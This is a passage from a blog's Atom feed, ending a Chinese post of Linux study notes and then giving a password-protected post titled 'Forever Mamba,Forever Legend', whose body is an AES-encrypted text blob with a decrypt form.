内容显示到屏幕上，这是很有用的参数</li></ul><p><img src="https://i.loli.net/2020/01/31/PrqT9MuwCtK6JUH.png" alt="本章重点"></p><p>肚子好饿~</p><p><img src="https://i.loli.net/2020/02/01/lDvYFTsmVg1475B.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本篇笔记内容均摘自&lt;strong&gt;鸟哥的Linux私房菜基础篇第四版&lt;/strong&gt;,以及个人在使用Kali Linux的一些心得,其实有一些东西之前用kali 慢慢用着就知道了,只是想利用一下寒假系统学习一下一个操作系统.&lt;/p&gt;
&lt;h1 id=&quot;0x00-计算机概论&quot;
      
    
    </summary>
    
    
      <category term="操作系统" scheme="https://hack-for.fun/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="Linux" scheme="https://hack-for.fun/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Forever Mamba,Forever Legend</title>
    <link href="https://hack-for.fun/posts/20200127/"/>
    <id>https://hack-for.fun/posts/20200127/</id>
    <published>2020-01-27T14:17:17.478Z</published>
    <updated>2020-01-31T17:13:27.287Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19rCQOJR4fB8BGcUHOrjJsoVtHbAnPkocf0fjeAde7d3ZFNFe/LnJJ9er5mIyPdpsaf7UI9yulU0rGswnc0yJGljO54x9urRMbgJ6UL8Hu9ItG1Vr8V4K8E2jDfoDHYeWhyCy5iZKMwTa/S+r+CrA0QT9FcAXHZ3+JT2PVRCRw/oy0hqPElbiSCWCgqzCvgzRsK7V+j9XYlwpBOUFzL1PrsgrdbclBaM6ggBZ9WVJ+RSEch3hNESXNueny3nS8vXQoQkPIa+kD6NEFdnbqBa6JRloi92mZrJQibEE/FEaklmG6s4xmIyvnETd7L1bgtd6zEV2w7uK0Woiyr+p6nns3VqEGKa2h5PT9ReNC/KagWX148jIxocmMJjiRfqvKwr1Tl7XnYWD16a47vDSYAHGLqey7jA8S7Mrep2iOdYV7t8JOtLo8mbNYVwDWT+X2ACpBZKqO0sZ6yQt/ol8uVbt+yutGVmnHtQdKdaPuNsCnuCyLbHVZXcs3sbuqKUnhVqzQRGXZsIZiJN+RAwA9xI4xYgx58uKkDYemxqUD/puBEc7iQ5JzUbQ2ISSTDv65kY/DchxZCfiutDi6gm12ezfP+pZb7TRXIZqJEnU+D+Noh0kS4gLlntPanzvVGdPVjBauQfvsc9zgX8+eGTGxeQByG3tQqbohZZseyIDKMDzxLdfDp1oik04KFE1JDU3qydgTZBGpoMFH7oRaPWP1tqiK73FKW496rHVHMYQLNyNcyyUP39uIugzvi+QIKmdMU1CVfntKiM8liGZBd447YKpH4TkWQ+qCY/+4/XGxxbj12Yve1E2zk7ixF/5VSWHmLEv+Plz8uxmR0VZ3ru/1N7MQ5ghFDTgKeNKE3YpYk1ccKlLRMpyACLzhpVw00pLsqxf0w9UGMYDi91CVdSO2Ai4s2xOu7rHVfdJpxg5j1Ro5yEof/cgGrr4wq140qmfzxFFKij9RGzyVAOXfrlFc5WK9Vl0Ek+zCRBwzwXBptxOeAj7IdMYhJoewKKvOkuv6Ofd3vEMbUrDvBKahkbUr6CRJn0BKMihPBB0fDWbVuDMpKpeTuro14E8u5ECDUNywCUoB6UESqr6k4rdj42Vs8zCd+Cs3JPAyhwariN0kLpN42YlqRyvIcytaDOrgJRaHpItYUl6VvbenCrLJXn92zDyYx3B54iyz2WL6ZFiYLNKR48Nb+hoDWeSTHixRV0P14oTxtmiBxBxjkdhBSY4RDD8DVSYZd/PSuR7qVXotVXd2dqGYDnFskxHPW9iEbgJOAKyo3yDKKPTmVdO3ivejKYx5wVnK4C5qwHEGxrybazeeHFyQ56mTMw9URXONWvPUZa4iywInggAG1ST975+Db8ABo3VZX8+9r1KgtUaQbICMw+T+wEfHMQ7FCFmdLjJLEacZNi+UjGyaQIRvJL99wGiDtQPGWsP2S6DGWWj3ulmQ4RpuEOmg1d3JGbeP7hL4XzFVs9gqd+qgdvPL6/nV2trWds+l4GjeKfosiwDQy7jWbQguyW7r9aJYXlLAI8d+pmY8V+8N+vtjNgbNYHyWijGawrr+OeJLozLtl8QtnS2XKAvhQjR/NFZQMCJfeW1tUNLTXAKRU/zFvGrL8Bi6tc1BPAsEjDztmmKJfs9fHqqIXo5v+xvfW0ZXHoz0LSOg99Lyibgq+5oeYe1AjpbTtUdC+Y1iRtMEShY0XuavDyepgEUJuGro/r7VkICOZmgaoWr01HmHLFSpAAjuYsB/ssgcTsUwSYrLHhP6gv9S9Sy3GFgvV1+mLcX5NR/qF/QQRMn/psBY6YsEpYL0oqsldpC9LfefAT2bFjPOScMK8j+g2VitpdNT6lLfIMa9/k3253POwJXy1EKYGxGe60ZUtxLQMdw39ixAuU914qlEQnt/THinAItZYTqV9kMcgUdcHIHtG8QKnz1IBG/gdkNV5oBNqzWvcz7QaI0pL3I8qbSjbSDUjvdIGdmZQi4VIVTBVFZZEj7BXAbRJFa2w+eF7seqjWhLu3t/xEAtq/FJlcVQZjjqgC4P8A44Gi6akOxcomLeKq8JhGzhBP69aw3ZkKTyxlQ7qpt5xEKi5rgn9byZrGzH/4cdR7Um6DbqJB/41hx0im6v/JbD3M4NiaftNm0CN6pWI1EqDyAvOsqhkhn4wCwrj8sC7YXnJSkNnzzjjCoDLSJTEh1AzbnuR85kY6JWVmqKm/4lCuTg8gOAMrKIc6+ZD9Y5vJJlWK5hHMwB7ddDbV6FtusYf6KRVVDn8Ghc3B2YmTxxGY4WUrrVs1Lu3Ks515WtcOgj8s/elasyccEFNWFbA+Fe7fqjBaGXvTf6Q1+WIP54ilnMKukcKPn4F33CUGAS7IqLvoLbiM1xhXdqDMU7Jx9Lu08P8uLGXvT7NHrpb9f22026CUbVINqxXOv7DEPC5C0SvLbaTdbdxbu5DjOo6lfANCg6icwmazric9zRfDB09PwWvx9bRuFYCRf9naf9bI4iqjhuDrPFF7PM8uTowDjAeoxE8Y+Y+Zb/bQUbBwHIdujWQqUkq5hRJUw/IkTuEnUEGK/B0W5ROjw7BiG8crMIEc7SG93S0nEMubTfvJ2S0n0LVhvgPSjtGn3nS9hQ0cSA2ZiHrHOlxofuS9Tuorw/lmXfFnZkRwJqfL3eTDSH79w7eqUAQq0zExk5dIJ+LuotH750dXZoL3N2TqdCsngaMd71oP/3L0EbTD/InhX8lJn0o1ry/SUzqIWLMT6A9E9xjj/dDiWYORmogMj7MP+GVpL0fvU/dHwW2PQW1Wcai5F/1LHEVGH9C5gaSYNIYj9uU8SWcokkLVkvWfqRtTUWuxO6SWrg3B4iMIPkq2YPrigPaApF3DQIlGyi+lWWBDhJIIyFnYW/vCreH0884Guu1hEwrVPByLUjBh43SK3yWnrlqQxYYUZPvtcv6ZG5NH+6MLxIb1pm/YmirwvD+yaL70zeHOsU6lmoPqivzw/GV+0kCOsohHU542WFxuOANLcIaaCQ0LnH6FTiZKWuad4wDhpI89ahvpPGu9WQ+ib5VJGXXpiWK8R/zE0aoA6v8K2S7IljOp9x7QPJG2zl4T9dmOK+lBqPPNsjft3HLabfufU99oUCUS1Buukkb3wzJ3oTVoAs71D5PE1R820f79qNQstY4Zch4T5SLH7RhiHxFwLOC1nTeSLxMLcqqWFrzdPeo6peWj08M/BtxbVCR6HSayt/xssXnz6yGhjfHCDe0ciAWLbQgroE7+txBHILVYgqDSg/n4FgkFKhn8rYZ1y2aqsUuP1HXe2UR1RhHNPueCLXRNNgdbdHbbG52z5fJX6pjw6XOhfIXfI/6T2kwM4mUXeMOqoSOG4SROEGWUYZGr10eQeQJS0gRbiyeVer3oe8iknFOVb9e1X6kM9vObR7v9jplBrIedfD/RgHCMnjJ10SikcaCbq9g1jTCiDdaFMWB5BrMjFErBkRf7ROmJFY9tY7dvpEQimBW/ieGxrAH8wKozJzz0MfnzuTH1WVUiMwJYi41r6yXzpXKPMugCntOhi7Tuq9xE7Fs3OWNXe+q6Q0iUE9TS1IepTAuLC02LzeHfBGWRmutBg/tM5V3C8WF3yTxSirWANrtpNLUSRsqUOpIEhw4hyHx6UP6/gbU+/DZ4+mIijtiaEHfQU6PdKP0Jby/VARTE0J1xbU31GgnteH2QtxXGD3G3Rrdge4IgiVmoVqeFhYK4tvZ/ioovFMdIVhNhfl4Dz4sEfY5exVKKLQvCWxMA4lFEDUSvvrwYvZGfQQDsykLlnP1rTVLmPfIehxapln6iFmjEi4xyc175SIgCgs3RZq5dSTvyY3rFm37uux0X1spY0wFOzmBS2cHTolYFh3D7f3B1AFbHkLk1wiKqL7gqP4tPDPD2+SOFC0pJyJwN7tiaKT1yfun5jaEHkkEFnJX3XG2Du4IpXiScfBOwOyNZmMFV9KvEbdvB4u7E4RFpFYVLy3UObQrvQj70Aco+jVkr3EKKLx6NZYtuebQjPSjHbPS0mpxp/23ShlpLs3P33Ksr4/htLjvD3YAhK2ty/twWpLTmbCSkHGU4QNrrGd2W2qHKaMyyuPks7Zb9/0zIwLMiGE2OaXpyoY9lT2hf2LSlM73/pFN9GmhISHaN7/iZIVvyI/HxbbhbOeBZCWmQxrqKM+Q1kcx0Xq1jhra34KoGPHwoq2PhCheFyD3NLrX/iprV82zBfGRhs4pUOQ+Zi/uvX/IwXdnZKXhB8iqilux/bIc0jZLIQRds7wukCBCBLJOnUiCorHfoZFmTssRRoILl0Vss9mVFbOKOYtkj1rjrIIX/AT45ld6xmt4HBZ7NmY9xnMoK+zzXRZV86bflLrIXcTu5PCKDV9HHf8XIITImE6rRBhYLgv+W8PMKfe/P0iAVJkOaiW4rSfmS6KepHW084YDUWpUJh2vWNB4KML85Ukd7NKU0ohkvrCliKWhYZuNHyh+ZjVhZdiIAPMYDFrqIC/tiZ4dIbFAFKuXftSmYnifIWMepFkUBL5/MXlt8cc7SVOwwexJgT0vlXdVz6lcC0pbA/Lj3GvRZK6c0uKkS6EokGJ4bsDA556e3UZx+KqeQHBEqm7mFh+AE8UQwwSxPIW+bHCrYJm59aqLRj3bFwSXzJfFNQ1x/z1hz+/ui1Fxf99m2bmCB0hKYdf3Q84HaYM6feb6/ZBANBzC6YF+/PmpYyJCzYexRpHN3c4c1zMUEcnERcpLpCNmVwNO5Zhez0U7CsWhmSh0/tn0xoP92asFPSXqmFAoqDnOm1dYzW9ShG5QsWYNirmFWGHAWal9OSyYlr41+eD9DPWmk+nkB1rBV75LMWA5XXdQHoj4uCvA8uMbFVfySYmhLr9AU5hRnVma44wUptwoCCXe54QCPcHN3YQSXCHtK//Lmx8pcUIf4J/528EbRj6Kvvl7oeI11LGGDWIXX4z43O9j0G5M8NkzTh9c4Ys4RyZd6aCfReCLrWrpikvs/0kwDvjOYvcmHAjGvtHkx78PZ8+ZGbkByE/FOLG+EMx62hJJjGuBzLy1Mm1aDgdVKQy455eZJLHaoxoyEXAVTwRUqqDwHmZJnN7pCNiZ2O1aDTfs1zZmcnOpZmNxOJN0DZX3O8hakGh+Qc2e7rsYM98dlPuUyzczdWBhFrrSSYJCG0m3mIYNSAS1q2LoTXuB2GqqLjpHfrD5nxinnHR288XJKIU0kkKoi8xzPUc9Pz3C43SORrp78+QQrXa+d7/B8ezqhmhLF9i952m0jpes/5nymmSSdlXtGMi4p2miDZMiOftFIfpM/f3ytFYv6PxOGnZ9WdHSQ7Pugj7UBri28ySwz9r4Ip+DN21pA0EvEvxxIe/xaNTI6bX5ekV0dVkIcrZwtY58xZQDcO0T54xDCo2RSUPkzd22ROULV0oONrfEG05fSGFNEXiweW2sjRxYl1OiwUWhlD8BCC+4Z7q03JHQkEU2N25Wt8IiBRnQ6ZAi7ccRIMwrv1jA1wxDOnAaQhx5p+cHf2tF8R9N749B/tbzhyDNx/2Vi+mg3x6xnsE7LQsffyZT8qMJ99cHjMKRwZONnaXIGax2tHqE9ZqwG7UCVZSDhVq5ypPXfu5Z/svZrSae1CG24Qxd3jh7PMx1qfdbR+RpD14JNleoSemmKIRaCEH0VQv8ZjgotEmnc4R44blWElZEMWZ0O02/p0B0+SqyLbzSgnJ4N86X6khMu8X1tXFGXhpQh3nVH/jSVbfEeT74QLakDB+bW2AXDnJTaBRZqccK3VbiwT1sulyc0WG5dDreHzfmAG3wAEvfDOcOZCS7su7I9JvShJBAeYUqXwxVoogo2+5CnrnTjO4nSkHNSUgZnthvk8dzOHzPC9z6mH+qzGsCPe7ghHZenlqXfq9UBjzcQQRVGxwWXszQH+vOpX7t8OZ0ZOUIKauZ+InmdzyNjBaW2ePTpvZ8TxTID1XKnbmFTqdOrR6JYA20qRIkicdpFZNYFaa8YpdvWfaTyso2GBeO/tvhNvKl/uCZc6HFUAoiPtsfqmXu8Rx0+9SFppPnKstZYeqwaNGGrqNrOT11g12vMCi3Jp9jfVaMI6/dltEPMbAINpTxtFiCEhqxW7PCesfWSm1RetsPHKqDsNFQGFFdDwimsenPtzucT+z2GYwLuYML7E9k3zE1ZMwolhfZYRYDuRX+tMxsQjmD6Q3XDI265SaCbrUw0ZYam1SmIonfudr6CK10x6pt9OajArpW8o6tBzc992XtJvKgISW6+RAL/Q/+4VFJI9jYO7/1QIxcM8DqoOB+4ZqBmuHgElXUkTBPW22cpnaj2Y5DWdCXseXplNJgWVpxpcp/pUT8F7DOWCa8fVIz3yh2f6rrTsEKIGm5QkOE9rc3Lbwg/+1L1qkpZJ/23JhsGvDkshUKkFiryhRZStG6ZOFgLyhZxyR6tYzjwj7rwhXruyXDEE/5qLwOFgfY7zqWg0sG5bmaA16pv2adIhFDpZHP5vTmLvLvwh5l0cJm3YR2neTGq7Jtv5G63k6BMJ0nlR0cFdj/VUc4gLSH0d48Sl1U8BGfFa7E3BtPRnJsEHkyVetLeC7taofCy+/96ztUZ4Yf7xmk5OpE09Z2J3XhbCvUjRl97l+clEZFoyBipIMbUzdX/QUtzrc4o6cD/p37tRppQMdI2a4BW0LOghgVkW1xvp5IoozTimPX792MSlFm15En4G3rL+527KsP6X4CWcBTu5cLNARYwvREaW3FQFLcVO2iqpy2gcaEugbKyh0og6hYF/LG7BYLEx/1YnTIfl4BDUettjTXEyeB4Hek8lU6j6ySg1PMYCiv5nUcksGfjSYHM7Gr0JEEE11g4YcWjSjzc2XgC+p1NEzyyd5hLxtF5ZCdjyXovFOWwA5DknIqPhfYVjPL3T0/Q4hEqO7Vuvq5RY2OXoS79Bq2gK4jgZDM4v4POUn2hGkzaA1cfpMwyKM/bLWESMxoll1I2eKm8kJOL59Xvmj70IPYUBlq2vmRXsy53cZjnIVVN8CsRxPOc3Uo4OVRJjdF539nVyMsqWp8gDdy5hCE3E0emSlGRLutuQnoF8d4ZK26q8UNFOVZnJQnGMwVwPxJgpZTuUWfe8nz0VlDAQ81KnZtjhMu8Vi0odiNLCG0kiksiJYMs+lyWWHCq+A9zCmj3O/SrhINlltX4Su/ccLlhIp1jFcB2IU1Kk3edIqfJUFJJ3MSsAoFutERXkxF0qT+v3P02zMqBO8aiYjP6A9xELoY2d35kQu4ahilLGfGJxoNDxVXk7nZnQO6VO0ESMCcZ4Qh4fB3hU7+Ssq1wZAngJQTxAt26fCXCeXza/pyVWpSjd5Jq8HcUVl5Tlg1yXLvvlH2aNvcU2LP0W5wYSvCGk+76ilJUzwmNTVtyXsLPwj/UbhMOgQC50wvWX0ikNRYQnM5hDvGLW84ds+XWwcaV8rgBSOtdhc0qEv/F1lGnHpzVNE1t1PfmcgJ+c0aKnxwI6In2HwA9hwIXp2DBDv10yIJeJdzGPqaKRFO+lzgqBGI3rDZq7RkE/4TI6dwrkk1uCfEM4hyqXz+TKf9cexCIEcECEzeyIK7jbvEFy8DYFwIdN08f30YmX5o69iMxjv9U3R/D8thoajtmre0zlkH6kEX2ESbiXmCLdziHWqo74Tcdseoj4deW8A7B1MSvzV06U+7zy5OQ4/jXwYhXiKZEdYL/ecfR+wPImGzG9fUOyai/eZtdY9sAvJupcHwDmDZOAf3lFvoP4pCWfPi6fusLG9cwHxTdnM2Xgg3ZnifCHsfZIDze1o8h3oGE1rUw7tjicV9KwEz84n68yw/iRAylFCBIWVynTB1ilhiwr6hgueYZw6SGjWTO7JfLok1t+p0R3wvAVlg735daqxXG+O48I1+a6/+NA02eXiMnWc+am/jc2wlVY75t0OvfRoT2cGbqeYzh4+R+V4KTSmixPIB3X+pCg18U7PXjdWj2npz+S3i8LqhBekHbMxuId+WlU1mzQQk5yAR3Wmt9meb1sH4ht4FA6fyiqIZeSL4J6SObw9CKLbAgUkcVgdHtQ4TCnuQ46TLvoGdH5e87toGrtTG1D7uj66thDR8deOUKE5SvXBrZrbbbQ1SgkGLOLx/QbQfXbYoI2G0Bug91wFGNo3PJ7RPchNQWP8Pp8yWrFWsx+q7EDguIxCu9P9yIrfXXf7dhaV8suPkLXdqoPLSkCpPt5EPGzqWsLy9FPQj+igT8SL1yCHJ03Dxd644yfchdzDuWemUBH38gTcCaSoKtMpfqLLoXEY2LGcZfVEvZcdT+hTE1GYLUuNdPP52GknPYUUTsqR0ne3BJuL05flZ4bpelVVPomMZ0c5VfCG0X8gnPLhm/D23eDHlkTjH3t7xCiyQsccubIWMcagjWgYz6AZPd5AB7agO6wBJqMH7EmH5tAnxYbJISFtBkLevHV65qI2R/fXukMFGDOeIJAg4qsihgSDc2ixNIz03Luo/LL9fCZEG7g7M16wxuXK9AryI4Qb7AcEt77RaK0m7J2jyZXCSsi0e28Fdhlr5Q/mKbPAMMvcxN5X5aAk1yWWNhMHIGp+nFO9ZhnO8Z1xPdRHgui1rx2P4lH/z9NYETTTyK9y66x7SUVGPgOSu7R3iVXJDKDN27su/FawjJSXR1GxAxDV2qaR0Dje/97oyVdaSUs8glCzypfn0oHoQpQf7Y/ZusTjg7hj1UXkkPGt1cFMacBWJT30EdxJZv24/BZjW3OHsXL2PeVZIFlqHbvVpQRRaxhgcxcgczdnf75o9LtOvO1nFg3yyHCeXXApk+er7kRnZnl5TPWgeL7PW5sS71lJv5mkc9J1696sAvvFL8NdkmVZTl2mbtDhYJ77gKf+ZVjMDeMJ3SHMXkHKe6MqhjTbf4nZ3WQLSo4jORQv9mfx9eeE/AzLdi26w4JlACQdyaYpVbMCM//2TsWMeHudbZ+12/frMdtZl4gMm+//wAAIIRzmzeaD2XHoeBSk170r86uWf8svULrSVb+Mpbvxcf3Qi6DQ2wTMIoKK/bq8PRoBoa84wU9tAYzPMo25iloXzRSNj05on1kuiUb2VGgB6vuU/iPofNM6Nbt5zOwRpgWJhPD347fBNoDCJ/aS+zbW/eMwAHtEpwwNAc3BRyn+rtBDt3lnXNno9ITOAtN2U9AB9fars4NC0400uAwF/tEQ4XBtokq45xw2VpHBhYCka1GgLrKzrvNxLginsNWeI21dK8yPkgPBuvbY2uASkgdprDfiQ+WQQUGcgMEpuTvnYTye/rlrYpX/rZ1JEwBqfaqN0XEI4KsnS0iXhhxS5uYCpb6gxXkqgrWK39xuSvXN4o09Fzzqw7BqKh+BAuJ24YzVTXZK5PXtjCJ5RuSqj3HYUF6hAiiLSb8LyAN0LtZ1zT0QynV3C9ISoBIqo9HumHei0VeyabXE/xQmJKdF5NqKCQZxFIgY0hJ8fdrPdelNSjg2FbQxzjGtvG5sHdAx9BMuIejCN93R1rNcDBdfZnsYKoao8iCHOhQmdgnKIKkGHioVNxF3klOKG4HjKrZday7X5sxy06GkSOfzZawRKvOYIpn8w/czULY5ABjELRnIeXqJY/LHYFbGDUPOdH1lfDXdDeF2H73ayRH4fRjXu0KtA7+Xzg/tJSU5hqfu8TLvpm8x6JR3w59D8rov6R2Oxdz6+UtLOtSK9oqN7E9lYy6qqoAsb+VntjiGTlEU02dtHnyh1Niii2ZoLWZYPPy5T7JZGz7Ul209Ucp8hlvyYRI4qp4xMrQLppmO5FSSLLzA3xVptGcHZzc4vhT5KzLL66TmiLEbmSpEcX8gR01HPwivU+2oEQmY9YKDzQWEZpD2ONGdJzGPbhVd54le/Sg/RYhyFYls1pY8KDvUnahU/bdp4rEioWJjLna5wtBcOmx9YCcvIm7vTDscbCbPBBsTVXuK0Tp1A4qMTW0fgL32Mu4uf/McAw681YbjaLK2h2Z1QCdmQflfevz3nTwme7LqalmFqQBvvazC9G0MO8GdNdQis9mDK996pQTVMIy4lORiHzfEFElJn8ovDs81OJH0TP0pRWtNAWMhuAyWJ/XMuayBfz4L2ITE6fF7q9GIskOn3VjGlYhjBJivrspZE4CuSDRcFUUEPyYhsTfXOJT5LKRdJofb9bPN4rj5idBHGOzk8LBIizxct7g9y2DmTAexwE4+ZkM5f+Lvg0PGaGrtChMHRaTU5xzXjzcI/sth4QzCMZpJC5OO7yOaLqghYq8ihXLonCVNUqu4FulQUlgEPbwckRgVR2EnTb+vqgqrYQpPF0mpyVBOSc5zOB/CUeIsb+DM+Xhfisxv/imW1LFkBvgcDqEQQZZAjw70wnnIcOvkhY264JEYYECXiVq5xmTvLBXr05gC7Amp51kS2qRvpGX/odL7C7Qt9Qa3wdscQeP/Tn5IaV7+b2PWE1Jpw2rm7A9KI4sc5AUTDqYUv+gpV2LkLkyrEtPqcxvzAhz6EzXSSXq+ppzsMI0ec5o2bG5yA1jeGw47Voz6oQpQKqnNPRu/nyL9qkUxM/aokEeYFT6F6R6JUljFkux8cF8Yf8+23stSa8tfaXdNPB8JYebSqdL0HRpntDwoS9aFuYFE3gxSMcK3gUH+hMxNFnTWpQV4eNaNsfWHiF1ez17y7rylRneIAujJZd7Mctd2UK5UcXFk33S0armYvx3RrntAmJ0q4k9tX8fNof3+13LgsuHdGRr84CdYUtR5fNzNQJrYOUBEJAeQtHTiJENaSWR+T9lebk2mprppN+bEZfh/pdP9sr5znw54KpWp7NUg8U14ZFMq17RaqCel3ZGAdtT9SvC93G52Kfn3F/ALPHxyaBkMgaQdBoKRAgVkRzT32/lytZpVeRlP9kqWVqgF9r6lvxazlaJbvpLYja9yaFvDmn/xPaWhcIqienigmkmXuexDBTCZ2UONO/vuRmT7cLXvn15QQXesvCYVMF/zGJDpido0Ued1+hio+7fImhSJ64btyrbgavAzg3ReNuVyJM/JjqntVoWLkoPVzT4gv6WmvmAdEgIF0hLH84lkPrQUl60l7qwO4LTIwLb7aOfgfPJu/SvQ5m0do/63f5oaBoYj7cO8HR20bMrYSK3yBv63+V7olY6DNIkX9OSSDUOYcjN6vedMzHKL5n5nfs1GuMJHKySjxk8W6HaZgqb+I454Vvl7ZKQnVHTmFMLM4c2Oi6tNOtttUWx57lE/yRwt5I5uXMYRZ4RhiRsd2hNNfLh95nEPm9VjKnUsLFmQh37Pk5vBVRVz2uDvjMl4zUm5xFJ6Ozu2YjeD309q4jam9KS5RnYxmDbNXNsZt+aYE3d9ctxvsUsa0XpV5GYtEwcgAt0HDZP7DApPJbqNK4j3A6XBUPJSVqoeriPwzpmfvZtICI15RQl3hH04D6ia8b8BqpWxhStdSR53Orc+nnixaLA9euqt54WuyLQVxx2rF57e5FA4cvb44ZTNJs6Pv7H6KG+hjJm3yj2NbUNu5a7IB10StKYA5xVjhHdEpBbqHzOxBXJ1Kzc1S1BTS2QEBm1PjCtd/K8yzLjYjZzO0Oo0TZ75P+oy2JqSiieE3EpxB2gENJbe4X+pOp4DQGRrPlw10BwL0NnBdBSjfDVDhOlLtWwZ67yoSoTJLOkWsVA0goDIqRYXB+wQpYtJrgbWeyNN9Rh5LGsSJP410sgvOVIP2OKBgY6A8svhjhpKOFwbICP3gHPa/hZuALxDtogo8qc8UqYBocTb1rE/VAIbL6kTUt2vBTy00Ax0dsaI1ZU5+QxPHBqmcYVSu8PGzuOxlMrjuOGW+rlBI0p9q3tzR4AQNgmL8nLsFbjpdcqziOHauD1ti6+Xr27Ii7iM7wLQZ27wK8o0GnYkutCgAq7tWpmsPnCEuODB5qvTXOB4z/U6eXryCVGiuRlNwI594pfTlAsl7l82kWtjCOJmIcjuucqsuDJN7JYyE+8JqZzg04/mI5Uq2kedvo2mz/BRBXzY0T7AVPf604cNvMfN3gXqutV594Y8ec7Xz6fTvg8I8TUfBQOJLsKpZulqBOeJNgNd1vwBiZNmmY3ZfnJewEQA7CG32EvohdYZy8/vuHWl8bxIdcJ+tgpsvIJ2lEMepPzz71Kt921zPzcKYWNPYkOwzDbwaMZSQrgs5yJ8EQhgxdWeVmc01E50h6zmBZ90ylOCzIj2v3khvsK1ZqxkC0vL8QcYyPKjdz7b4/ZA6TRW94auTrr9Y98gqJXIGUR8Go6vRbK8FbUg0h0BIetDU6zPLkypKo2YRyTsbC3+qq9kyuY6XIIQL7HGDz5eZrKXE6B5KBKUQB5RhP3ZnqQL6sFrBUpeBpRzfvncsIURjGgOF80aXs9iz8RFJPh4d31rXT9pDpQtpOioiOrvyYGN8DNF/1nI19pNkfusc3LTD0uz6EW5NzfF8evcYQrWAIOyTFeF4aSI3N56dp8eSDQSFAM14l2T94JoGsix8c3Rkq6I83TXz2LJ36V9GQzjnlDT6+srml+ogZ9ZO8/kh4SGhbxTkhcq3YuGelyiF8keInKxgenerjW/aiGIVjsmWU8q9FIOkava/4rTC26IM7AeoB7zQRc3+/gL+RJ3yN034prmI1dYBaVUNOqzx+UfFPK7yoDEIy8onEqMTGs06xFEm4K0hPvPabbSR7fCIvuQ/u3XzST98qRzh4fTmox0dZyL6Q3jYBHysQLcy1aURQhlFinGdiV5G4zGjDE2e7a+wC37pVxFQB8E9hwjOA5lqD0uWR0ed+5ISzb/m2lexM+dGiAtBD9cnrlQcAR9AeoGAXPEcTB/FxIp2GJ5peVO8to9DOrDQEMm5ojtVmZrc46CS6H4hxMVh0xAArCpBBa/aIBlgTkITpzZs0W/cbj1Gqzi7dwtieWIV5XderAti0Bc1yS3cd3Lh3cyaSsGwXGgb9+3SEzvdPtVo+eA5HJurPz56VG9fYyNAolkfxe904pGxj8Y0LAqEQVHesODyU215dfl+GYaaRMmTimJWPo0kZdvmGcnMXY6LafkRKTLdxsisWBwvXSpo3qR8ZAkWLdeha2JcdvZIw1tcm5fBbxxClDAXyqBr94NuMEJkFLDWN3n2NlmQJQ2+rVQcf0FStDEpGbV8I8HfUgrBa8/sa1GILhCIOe92lKpsOTvm2WLBqSFOyPD7NFyNUnINRshaWGhHJpHkX+as+vklcU72YLEXO/FGy6IoI1y56YsjrYylh891YhxfolmSVl4FcFAQpqfG0P2GllTYRQauijD+C6CyWwa02CztZ910AoZLKC++lkZWpsb2WPOkBFygsGhAsgfRImvBNDoC20zBjTDyqfkcO3TijTP/3HKfZrfKzZiiQH2JP/8c9FXjXmGanduJPRsPztkb09Zog8/x3ICpuEKYXY2x6HT9WrPVvkh6NLMCk15tIguSKxIZBTnlXyzCTLSXZQkjYpXhTvqVBXus2l3fkOEftWEf9CZl2t/UPz/ZPPL4Y5SDNMjN7oJiGJM6vfcxD5ro4U0BGmlfWFHCRVNOmZMMe9pgnKCJVUKC+WXhHbyS/viCnnUBitQAKDLodU3Hi/5HPvU9Zgq6bRvkiLvLCufeoZJJgRlVHC22Ers+wWZSqpKDNA3jqFm4NJBG5Vc7yMlYr9f64Ka11o5crW4dOxRhhFIQ/nEkFsIQ3lKuRuEuSc0eTBBsi6Rvig9hTGEfs7+1+CHZDpQDeghkb6qg1T9HzR3QgsI2SO7OUZPA5IeHuH94wk505SjKnBfIWUpilItmlFVEqrH3GtApOY79NaR0NoItu9hEGZSNE2QQUwRsoXNXrzdtAwlHtKl0B4v4zfG9/wCfjDZKXxb5OigmAR5lSiOi+pnNoOsXEnmCTRKxK9M/4Fr7Qsv+Ghhdh3hdwOxkseKiRclno1WuWWawRTUgwkcHMb0CNrTqGaTzsocVJEc9sFbA4+kdlLhSrl2Alj4pQXQiv5Xp3l2VwB9oQPVpy/9mylKi9KHcFU9gilHi0prB7FWCi1FIhX9+7pr/qiRFQfIYHS/7h6lZoFes000O07iarySjubrtkXio9kBS4NVunu20N2ivPYytxG3xp6wdepMbJXdqjZb+PyltKTa+eKJ/bhVnHv8sJQ2aC32f19I4HTqruv+PO9lsJ0HtiZisntzqIk8VlNwHAcQyqaCG9nbIvHCDogW7ZsLEfQWekLE2gWCW5qLLb7q6o9MDuRXPMoqfdyMTIFJF398yZy1e+Mrs+tTTmB1zPbYJI0eT4ITRB4vfA26QiiaL4aD2CtX1/wMzeZ+4F1EzBgNhq9XaGmQc77omQSnzsRJj8+tzZLIkGqT7hYdo428S+kZrbhlOhx/QWNVVqFxSkG643PI5ORUiOv8ZpT7zpWrO510haZCtf48PZLydMiA97jfVbCzrlZMDObYCa0/YWm9o8yyhQgqSMG+RhdNUhc3gHUrhp9AJADa6761TBIaijF4ET38xAkZHkOl1gvH2PI2Ts12vME4M/POz8F0RRmJbzaiBNzpGP7g+lEgaEfRU88Jhh1+fhOn6pTvGNJ3CBebIPOJU7o6Pzlc0ONrktjRnzvxfKtlj4cOaIq0ueFV+7st9B7mM9v3dbudO0o6QhK6Q/9uEcmIJAxb8U7AVS1UsSTVLRKJc0kxqboOh25muIXGneGOcSsdKExY0SnVYO5+tFz6zBXPbTZ8lQ9Rs9XziT//dWNcQ9VE4l59tU1rpXMy4YNm95NSsoaKZQ91dDqeL3UgSB3XPaAndwHEAnBk23mDwFBFPWMKTKcOI5hnjYJZ+/Bet